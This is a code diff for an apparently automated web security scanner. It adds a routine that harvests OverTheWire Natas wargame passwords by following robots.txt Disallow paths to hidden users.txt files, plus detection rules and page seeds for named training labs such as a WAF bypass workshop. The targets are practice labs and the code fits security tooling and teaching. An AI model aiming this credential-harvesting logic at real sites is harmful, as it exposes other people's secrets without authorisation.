@@ -107,6 +107,32 @@ async function bootstrapNatasCreds(
     const lm = usersDoc.body.match(lineRe);
     if (lm) return { user: `natas${targetLevel}`, pass: lm[1] };
   }
+  // Natas3+ hides next-level creds in robots.txt Disallow paths (e.g. /s3cr3t/users.txt).
+  const priorLevel = targetLevel - 1;
+  const priorBase = `http://natas${priorLevel}.natas.labs.overthewire.org`;
+  const robotsDoc = await probe.get(`${priorBase}/robots.txt`, {
+    maxBytes: 4096,
+    headers: basicAuthHeader(priorCreds)
+  });
+  if (robotsDoc.status === 200) {
+    const disallowRe = /^Disallow:\s*(\/\S+)/gim;
+    let dm: RegExpExecArray | null;
+    while ((dm = disallowRe.exec(robotsDoc.body))) {
+      const secretPath = dm[1].replace(/\/$/, "");
+      const secretUrl = `${priorBase}${secretPath}/users.txt`;
+      const secretDoc = await probe.get(secretUrl, {
+        maxBytes: 4096,
+        headers: basicAuthHeader(priorCreds)
+      });
+      if (secretDoc.status !== 200) continue;
+      const secretLineRe = new RegExp(`^natas${targetLevel}:(\\S+)`, "m");
+      const slm = secretDoc.body.match(secretLineRe);
+      if (slm) return { user: `natas${targetLevel}`, pass: slm[1] };
+      const secretCommentRe = new RegExp(`password for natas${targetLevel} is (\\S+)`, "i");
+      const scm = secretDoc.body.match(secretCommentRe);
+      if (scm) return { user: `natas${targetLevel}`, pass: scm[1] };
+    }
+  }
   return null;
 }
 
@@ -649,7 +675,9 @@ const DEEP_RULES = new Set<string>([
   "clientSideDeserializationEvidence",
   "clientSideOverthewireLeviathanEvidence",
   "clientSideSecurityWriteupEvidence",
-  "clientSideNorthStarAgiCtfEvidence"
+  "clientSideNorthStarAgiCtfEvidence",
+  "clientSideWafWorkshopEvidence",
+  "clientSideBugforgeLabEvidence"
 ]);
 const DEEP_MIN_CONFIDENCE = 0.5; // deep tier surfaces strong heuristics, not just hard proof
 const DEEP_MAX_PAGES = 6;
@@ -1609,6 +1637,40 @@ function extractCtfChallengeSeeds(html: string, pageUrl: string): string[] {
   const linkRe = /href\s*=\s*["'](\/(?:about|login|register|latest-flags|top10))["']/gi;
   let m: RegExpExecArray | null;
   while ((m = linkRe.exec(html))) {
+    try {
+      out.add(new URL(m[1], pageUrl).toString());
+    } catch {
+      /* ignore */
+    }
+  }
+  return [...out];
+}
+
+/** h3xstream WAF Bypass Workshop mkdocs lab chapters (waf-workshop/site). */
+function extractWafWorkshopMkdocsSeeds(html: string, pageUrl: string): string[] {
+  if (!/WAF Bypass Workshop|h3xstream\.github\.io\/waf-workshop|ModSecurity[\s\S]{0,80}libinjection/i.test(html))
+    return [];
+  const out = new Set<string>();
+  const pageOrigin = new URL(pageUrl).origin;
+  for (const p of [
+    "/waf-workshop/site/",
+    "/waf-workshop/site/03-lab/",
+    "/waf-workshop/site/03-sql-syntax/",
+    "/waf-workshop/site/02-lab/",
+    "/waf-workshop/site/01-lab/",
+    "/waf-workshop/site/waf/"
+  ]) {
+    try {
+      const u = new URL(p, pageUrl);
+      if (u.origin !== pageOrigin) continue;
+      out.add(u.toString());
+    } catch {
+      /* ignore */
+    }
+  }
+  const linkRe = /href\s*=\s*["'](\.\.\/[^"'#?]*(?:lab|sql-syntax|encoding|waf)[^"'#?]*)["']/gi;
+  let m: RegExpExecArray | null;
+  while ((m = linkRe.exec(html)) && out.size < 10) {
     try {
       out.add(new URL(m[1], pageUrl).toString());
     } catch {
@@ -2793,6 +2855,7 @@ export async function runDeepScan(targetInput: string, opts: FreeScanOptions = {
   const ctfChallengeSeeds = extractCtfChallengeSeeds(home.body, home.finalUrl);
   const exploitEducationSeeds = extractExploitEducationSeeds(home.body, home.finalUrl);
   const burpBountyLabSeeds = extractBurpBountyLabSeeds(home.body, home.finalUrl);
+  const wafWorkshopSeeds = extractWafWorkshopMkdocsSeeds(home.body, home.finalUrl);
   const yogsecXssLabsSeeds = extractYogsecXssLabsSeeds(home.body, home.finalUrl);
   const hacker101CtfSeeds = extractHacker101CtfSeeds(home.body, home.finalUrl);
   const owaspBricksSeeds = extractOwaspBricksSeeds(home.body, home.finalUrl);
@@ -2881,6 +2944,7 @@ export async function runDeepScan(targetInput: string, opts: FreeScanOptions = {
       ...ctfChallengeSeeds,
       ...exploitEducationSeeds,
       ...burpBountyLabSeeds,
+      ...wafWorkshopSeeds,
       ...yogsecXssLabsSeeds,
       ...hacker101CtfSeeds,
       ...owaspBricksSeeds,
